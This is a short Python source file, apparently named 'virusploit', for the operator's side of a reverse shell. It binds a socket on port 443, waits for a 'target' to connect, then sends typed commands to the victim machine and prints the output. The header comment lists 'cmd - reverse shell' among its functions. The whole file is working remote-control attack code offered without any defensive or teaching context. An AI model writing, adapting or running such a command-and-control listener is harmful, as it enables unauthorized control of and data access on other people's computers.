# COMMAND LIST:
# viewcwd- show all files in directory where file is running
# cmd - reverse shell
#
#
#
#
#
#
#
#
import socket
import sys
import time
import os
import subprocess

print("welcome to virusploit")


def socket_create():
    print("----------------------------Creating Socket-----------------------------")
    try:
        global host
        global port
        global s
        host = "192.168.1.137"
        port = 443
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error: " + str(msg))


def socket_bind():
    print("--------------------------Binding Socket----------------------------------")
    try:
        print("BINDING SOCKET TO PORT: " + str(port))
        s.bind((host, port))
        print("Binded")
        s.listen(1)
    except socket.error as msg:
        print("socket binding error: " + str(msg) + "\n" + "Retrying....")


def socket_accept():
    global conn
    conn, address = s.accept()
    print("--------------TARGET JOINED THE SERVER---------------------------")
    print("IP " + address[0] + "|PORT " + str(address[1]))


def command():
    global command
    command = input(str("command>> "))
    conn.send(command.encode())

    if command == "cmd":
        CMD(conn)

    else:
        print("Command not recognised")


def exe():
    while True:
        files = conn.recv(1024)
        files = files.decode()
        print(files)


def CMD(conn):
    while True:
        cmd = input("")
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()
    command()


main()
